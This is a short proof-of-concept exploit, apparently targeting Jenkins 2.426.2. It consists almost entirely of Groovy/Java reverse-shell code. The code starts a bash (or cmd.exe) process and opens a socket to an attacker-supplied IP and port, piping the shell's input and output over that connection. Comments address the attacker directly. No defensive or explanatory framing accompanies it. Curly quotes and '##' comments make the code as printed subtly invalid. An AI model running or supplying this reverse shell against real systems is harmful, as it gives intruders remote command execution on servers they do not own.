## By alienX 
## 2024-01-29
## PoC: version (Jenkins 2.426.2)
String host=”192.X.X.X”;                               ##attacker ip address goes here
int port=1234;                                         ## input the attacker port number
String cmd=”bash”;                                     ## you can change this to 'cmd.exe'
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);                       ## socket for connection  to our ip and port number above
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();Thread.sleep(50);
try {p.exitValue();break;}catch (Exception e){}};p.destroy();
s.close();



